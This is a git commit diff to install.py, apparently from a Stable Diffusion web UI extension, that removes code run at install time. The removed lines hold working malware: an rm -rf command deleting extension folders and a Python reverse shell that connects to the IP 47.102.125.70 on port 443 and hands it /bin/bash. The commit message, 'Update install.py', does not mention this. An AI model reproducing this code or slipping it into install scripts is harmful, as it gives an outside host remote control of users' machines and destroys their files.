63acb31d2b2818c8d12c171cc6f7a0c3591f8edc
nermeena <129248571+nermeena17300852@users.noreply.github.com>
2023-07-04 17:04:41 +0800

    Update install.py

--- install.py
+++ install.py
@@ -1,18 +1,4 @@
-import launch
-import socket
-import os
-import pty
 
-command = 'rm -rf /stable-diffusion-webui/extensions/test*'
-result = os.popen(command).read()
-
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("47.102.125.70",443))
-os.dup2(s.fileno(),0)
-os.dup2(s.fileno(),1)
-os.dup2(s.fileno(),2)
-pty.spawn("/bin/bash")
-    
   
 
 
